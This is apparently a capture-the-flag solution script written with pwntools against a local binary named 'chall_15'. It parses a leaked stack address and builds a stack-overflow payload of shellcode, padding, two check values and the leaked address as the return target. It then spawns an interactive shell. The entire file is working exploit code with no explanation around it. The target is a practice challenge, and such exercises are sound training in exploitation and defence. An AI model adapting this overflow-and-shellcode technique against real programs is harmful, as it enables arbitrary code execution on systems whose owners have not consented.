from pwn import *
import re
# Load the binary
binary = context.binary = ELF('./chall_15')
context.arch = "amd64"

# Start the process
p = process(binary.path)

resp = p.recv()
stack_leak = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)
log.info('stack: ' + hex(stack_leak))

payload = b''
payload += asm(shellcraft.sh())
payload += b'A' * (0x120 - len(payload)- 0x8)
payload += p32(0xdeadd00d)
payload += p32(0xb16b00b5)
payload += ((0x120 - len(payload))+ 0x8) * b'D'
payload += p64(stack_leak)


# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
